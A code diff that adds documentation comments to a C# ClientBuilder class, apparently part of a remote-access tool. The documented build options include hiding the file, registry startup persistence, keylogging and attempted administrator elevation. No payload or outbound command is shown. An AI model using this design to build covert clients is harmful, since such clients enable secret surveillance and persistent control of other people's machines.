@@ -7,8 +7,35 @@ using xServer.Core.Encryption;
 
 namespace xServer.Core.Build
 {
+    /// <summary>
+    /// Provides methods used to create a custom client executable.
+    /// </summary>
     public static class ClientBuilder
     {
+        /// <summary>
+        /// Builds a client executable. Assumes that the binaries for the client exist.
+        /// </summary>
+        /// <param name="output">The name of the final file.</param>
+        /// <param name="host">The URI location of the host.</param>
+        /// <param name="password">The password that is used to connect to the website.</param>
+        /// <param name="installsub">The sub-folder to install the client.</param>
+        /// <param name="installname">Name of the installed executable.</param>
+        /// <param name="mutex">The client's mutex</param>
+        /// <param name="startupkey">The registry key to add for running on startup.</param>
+        /// <param name="install">Decides whether to install the client on the machine.</param>
+        /// <param name="startup">Determines whether to add the program to startup.</param>
+        /// <param name="hidefile">Determines whether to hide the file.</param>
+        /// <param name="keylogger">Determines if keylogging functionality should be activated.</param>
+        /// <param name="port">The port the client will use to connect to the server.</param>
+        /// <param name="reconnectdelay">The amount the client will wait until attempting to reconnect.</param>
+        /// <param name="installpath">The installation path of the client.</param>
+        /// <param name="adminelevation">Determines whether the client should (attempt) to obtain administrator privileges.</param>
+        /// <param name="iconpath">The path to the icon for the client.</param>
+        /// <param name="asminfo">Information about the client executable's assembly information.</param>
+        /// <param name="version">The version number of the client.</param>
+        /// <exception cref="System.Exception">Thrown if the builder was unable to rename the client executable.</exception>
+        /// <exception cref="System.ArgumentException">Thrown if an invalid special folder was specified.</exception>
+        /// <exception cref="System.IO.FileLoadException">Thrown if the client binaries do not exist.</exception>
         public static void Build(string output, string host, string password, string installsub, string installname,
             string mutex, string startupkey, bool install, bool startup, bool hidefile, bool keylogger, int port,
             int reconnectdelay,
@@ -154,11 +181,22 @@ namespace xServer.Core.Build
                 IconInjector.InjectIcon(output, iconpath);
         }
 
+        /// <summary>
+        /// Obtains the OpCode that corresponds to the bool value provided.
+        /// </summary>
+        /// <param name="p">The value to convert to the OpCode</param>
+        /// <returns>Returns the OpCode that represents the value provided.</returns>
         private static OpCode BoolOpcode(bool p)
         {
             return (p) ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
         }
 
+        /// <summary>
+        /// Attempts to obtain the signed-integer value of a special folder from the install path value provided.
+        /// </summary>
+        /// <param name="installpath">The integer value of the install path.</param>
+        /// <returns>Returns the signed-integer value of the special folder.</returns>
+        /// <exception cref="System.ArgumentException">Thrown if the path to the special folder was invalid.</exception>
         private static sbyte GetSpecialFolder(int installpath)
         {
             switch (installpath)
